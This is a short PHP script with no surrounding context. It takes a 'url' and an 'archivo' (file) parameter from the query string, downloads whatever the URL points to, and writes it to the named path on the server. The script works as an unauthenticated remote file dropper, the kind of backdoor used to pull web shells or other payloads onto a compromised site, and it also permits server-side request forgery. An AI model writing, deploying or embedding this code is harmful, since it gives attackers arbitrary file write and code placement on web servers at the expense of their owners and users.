<?php 
if(isset($_GET['url']) && isset($_GET['archivo'])) {
    file_put_contents($_GET['archivo'], file_get_contents($_GET['url']));
} else {
    echo "error";
}
 ?>